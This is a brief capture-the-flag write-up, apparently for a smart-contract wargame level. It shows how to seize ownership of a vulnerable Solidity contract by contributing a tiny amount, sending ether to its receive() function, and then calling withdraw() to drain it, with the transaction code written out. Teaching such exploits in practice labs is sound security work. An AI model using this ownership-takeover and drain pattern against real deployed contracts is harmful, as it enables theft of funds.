# Answer

The main challenge here is to become the owner. Two ways can be used to achieve this.

## 1. Becoming the owner

### Option 1

Simply DOS the ```contribute()``` function until one exceeds the owners 1000 ether contribution.

### Option 2

Option 1 would take a long time and require a lots of gas. Luckily the contract exposes ```receive()``` function which allows for anyone to become a contract owner by transfering any amount of funds as long as the msg.sender was already a contributor. So the solution is as follows:

Become a minimal contributor:

```solidity
await sendTransaction({
    to: contract.address,
    from: player,
    data: '0xd7bb99ba', // contribute() function selector
    value: 1,
});
```

Calling the receive() method:

```solidity
await sendTransaction({
    to: contract.address,
    from: player,
    value: 1,
});
```

## 2. Reduce balance to 0

After becoming the owner, second part is rather trivial and requires only to call the ```withdraw()```.

```js
await contract.withdraw()
```